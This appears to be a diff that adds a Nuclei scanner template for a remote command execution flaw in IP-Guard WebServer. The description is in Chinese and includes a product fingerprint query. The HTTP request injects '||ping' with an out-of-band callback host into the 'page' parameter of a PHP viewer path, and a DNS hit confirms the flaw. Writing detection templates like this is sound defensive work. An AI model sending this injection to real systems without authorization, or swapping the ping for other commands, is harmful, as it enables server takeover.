@@ -1,0 +1,31 @@
+id: ip-guard-webserver-rce
+
+info:
+  name: IP-Guard Webserver 远程命令执行
+  author: xingyun
+  severity: critical
+  description: |
+    IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。
+    IP-guard WebServer远程命令执行漏洞。攻击者可利用该漏洞执行任意命令，获取服务器控制权限。
+    "IP-guard" && icon_hash="2030860561"
+  reference:
+    - MDPOCS/Ip_Guard_Webserver_View_Rce_Poc.py at 35788...
+  tags: rce,ipguard
+
+http:
+  - raw:
+      - |
+        GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
